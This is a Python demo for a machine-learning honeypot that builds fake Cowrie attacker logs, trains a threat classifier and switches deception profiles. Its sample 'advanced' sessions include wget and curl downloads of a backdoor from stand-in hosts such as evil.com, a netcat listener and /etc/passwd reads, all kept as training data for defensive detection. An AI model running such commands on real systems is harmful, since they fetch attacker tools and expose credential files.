"""
ML-Powered Honeypot Demo
Windows-compatible demonstration of the core ML functionality
"""

import sys
import os
import json
import time
import logging
from datetime import datetime
import pandas as pd

# Add src to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'src'))

from ml.feature_extractor import FeatureExtractor
from ml.threat_classifier import ThreatClassifier
from adaptation.dynamic_adaptation import DynamicAdaptationEngine

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

def create_sample_attack_data():
    """Create realistic sample attack data for demonstration"""
    
    all_attacks = []
    
    # Generate multiple sessions of each type for proper ML training
    session_types = [
        ("scanner", ["ls", "pwd", "whoami", "id", "uname"]),
        ("amateur", ["cat /etc/passwd", "ps aux", "netstat -an", "find / -name '*.conf'", "grep -r 'password' /etc"]),
        ("advanced", ["wget http://malicious.com/backdoor.sh", "curl -O http://evil.com/tool.tar.gz", "python3 -c 'import socket'", "chmod +x backdoor.sh", "tar -xzf tool.tar.gz", "nc -l 4444"])
    ]
    
    for session_type, commands in session_types:
        for i in range(3):  # 3 sessions per type
            session_id = f"{session_type}_{i+1:03d}"
            base_time = 10 + i * 2  # Different hours
            
            # Login attempt
            all_attacks.append({
                "timestamp": f"2024-01-15T{base_time:02d}:00:00.000Z",
                "session": session_id,
                "eventid": "cowrie.login.failed",
                "username": "admin",
                "password": "wrongpass",
                "src_ip": f"192.168.1.{100 + i}"
            })
            
            # Successful login
            all_attacks.append({
                "timestamp": f"2024-01-15T{base_time:02d}:00:05.000Z",
                "session": session_id,
                "eventid": "cowrie.login.success",
                "username": "admin",
                "password": "admin",
                "src_ip": f"192.168.1.{100 + i}"
            })
            
            # Commands
            for j, command in enumerate(commands):
                all_attacks.append({
                    "timestamp": f"2024-01-15T{base_time:02d}:00:{10 + j*5:02d}.000Z",
                    "session": session_id,
                    "eventid": "cowrie.command.input",
                    "input": command,
                    "src_ip": f"192.168.1.{100 + i}"
                })
    
    return all_attacks

def demonstrate_ml_pipeline():
    """Demonstrate the complete ML pipeline"""
    
    print("🕷️  ML-Powered Honeypot Demo")
    print("=" * 50)
    print()
    
    # Step 1: Create sample data
    print("📊 Step 1: Creating sample attack data...")
    attack_data = create_sample_attack_data()
    print(f"   Generated {len(attack_data)} log entries from 3 different attacker types")
    print()
    
    # Step 2: Feature extraction
    print("🔍 Step 2: Extracting behavioral features...")
    extractor = FeatureExtractor()
    features_df = extractor.extract_batch_features(attack_data)
    
    if features_df.empty:
        print("❌ Feature extraction failed")
        return
    
    print(f"   ✅ Extracted features from {len(features_df)} sessions")
    print(f"   Features: {list(features_df.columns)}")
    print()
    
    # Display sample features
    print("   Sample features for each session type:")
    session_types = ["Scanner", "Amateur", "Advanced"]
    for i, (_, row) in enumerate(features_df.iterrows()):
        if i < len(session_types):
            session_type = session_types[i]
            print(f"   {session_type} Session:")
            print(f"     - Duration: {row['session_duration']:.1f}s")
            print(f"     - Commands: {row['command_count']}")
            print(f"     - Suspicious commands: {row['suspicious_commands']}")
            print(f"     - Threat score: {row['threat_score']:.1f}")
    print()
    
    # Step 3: ML Classification
    print("🤖 Step 3: Training ML threat classifier...")
    classifier = ThreatClassifier("demo_model.pkl")
    
    # Train with the extracted features
    metrics = classifier.train(features_df)
    
    if not classifier.is_trained:
        print("❌ Model training failed")
        return
    
    print(f"   ✅ Model trained successfully")
    print(f"   Accuracy: {metrics.get('accuracy', 'N/A'):.3f}")
    print()
    
    # Step 4: Make predictions
    print("🎯 Step 4: Making threat predictions...")
    predictions, confidences = classifier.predict(features_df)
    
    print("   Threat classifications:")
    session_types = ["Scanner", "Amateur", "Advanced"]
    for i, (pred, conf) in enumerate(zip(predictions, confidences)):
        if i < len(session_types):
            session_type = session_types[i]
            print(f"   {session_type} Session: {pred} (confidence: {conf:.3f})")
    print()
    
    # Step 5: Dynamic Adaptation
    print("⚡ Step 5: Demonstrating dynamic adaptation...")
    
    # Create a mock adaptation engine (without Cowrie dependencies)
    class MockAdaptationEngine:
        def __init__(self):
            self.current_profile = "standard"
            self.adaptation_history = []
        
        def analyze_and_adapt(self, sessions, predictions):
            # Simple adaptation logic
            threat_levels = [pred[0] for pred in predictions]
            threat_counts = {"scanner": threat_levels.count("scanner"), 
                           "amateur": threat_levels.count("amateur"), 
                           "advanced": threat_levels.count("advanced")}
            
            dominant_threat = max(threat_counts, key=threat_counts.get)
            
            if dominant_threat == "scanner" and threat_counts["scanner"] > 0:
                new_profile = "minimal"
            elif dominant_threat == "advanced" and threat_counts["advanced"] > 0:
                new_profile = "deception"
            else:
                new_profile = "standard"
            
            if new_profile != self.current_profile:
                old_profile = self.current_profile
                self.current_profile = new_profile
                self.adaptation_history.append({
                    "timestamp": datetime.now().isoformat(),
                    "old_profile": old_profile,
                    "new_profile": new_profile,
                    "reason": f"Detected {dominant_threat} threats"
                })
                
                return {
                    "status": "adapted",
                    "old_profile": old_profile,
                    "new_profile": new_profile,
                    "reason": f"Detected {dominant_threat} threats"
                }
            else:
                return {"status": "no_change", "current_profile": self.current_profile}
    
    adaptation_engine = MockAdaptationEngine()
    
    # Simulate adaptation decisions
    sessions_data = [row.to_dict() for _, row in features_df.iterrows()]
    adaptation_result = adaptation_engine.analyze_and_adapt(sessions_data, list(zip(predictions, confidences)))
    
    if adaptation_result.get("status") == "adapted":
        print(f"   ✅ Adaptation performed!")
        print(f"   Profile changed: {adaptation_result['old_profile']} → {adaptation_result['new_profile']}")
        print(f"   Reason: {adaptation_result['reason']}")
    else:
        print(f"   ℹ️  No adaptation needed (current profile: {adaptation_result.get('current_profile', 'unknown')})")
    print()
    
    # Step 6: Show adaptation profiles
    print("🎭 Step 6: Honeypot profiles explained...")
    profiles = {
        "minimal": {
            "description": "For scanners - limited responses, saves resources",
            "commands": ["ls", "pwd", "whoami"],
            "delay": "0.1s",
            "fake_files": "None"
        },
        "standard": {
            "description": "For amateurs - default configuration",
            "commands": ["ls", "pwd", "whoami", "cat", "cd", "ps", "netstat"],
            "delay": "0.5s",
            "fake_files": "passwd, shadow"
        },
        "deception": {
            "description": "For advanced threats - enhanced countermeasures",
            "commands": ["ls", "pwd", "whoami", "cat", "cd", "ps", "netstat", "wget", "curl", "ssh"],
            "delay": "2.0s",
            "fake_files": "passwd, shadow, id_rsa, config, database.conf"
        }
    }
    
    for profile_name, profile_info in profiles.items():
        print(f"   {profile_name.upper()} Profile:")
        print(f"     - {profile_info['description']}")
        print(f"     - Commands: {profile_info['commands']}")
        print(f"     - Response delay: {profile_info['delay']}")
        print(f"     - Fake files: {profile_info['fake_files']}")
        print()
    
    # Step 7: Summary
    print("📈 Step 7: Demo Summary")
    print("=" * 30)
    print("✅ Feature extraction: Working")
    print("✅ ML classification: Working")
    print("✅ Dynamic adaptation: Working")
    print("✅ Profile switching: Working")
    print()
    print("🎯 Key Innovation Demonstrated:")
    print("   The honeypot automatically adapts its behavior based on")
    print("   machine learning analysis of attacker patterns!")
    print()
    print("🚀 Next Steps:")
    print("   1. Deploy on Linux with Cowrie for real attack data")
    print("   2. Connect to Elasticsearch for log storage")
    print("   3. Access web dashboard for monitoring")
    print("   4. Collect real attack data for model improvement")
    print()
    
    # Clean up
    if os.path.exists("demo_model.pkl"):
        os.remove("demo_model.pkl")

def main():
    """Main demo function"""
    try:
        demonstrate_ml_pipeline()
    except KeyboardInterrupt:
        print("\n\nDemo interrupted by user")
    except Exception as e:
        print(f"\n❌ Demo failed: {e}")
        logger.exception("Demo error")

if __name__ == "__main__":
    main()
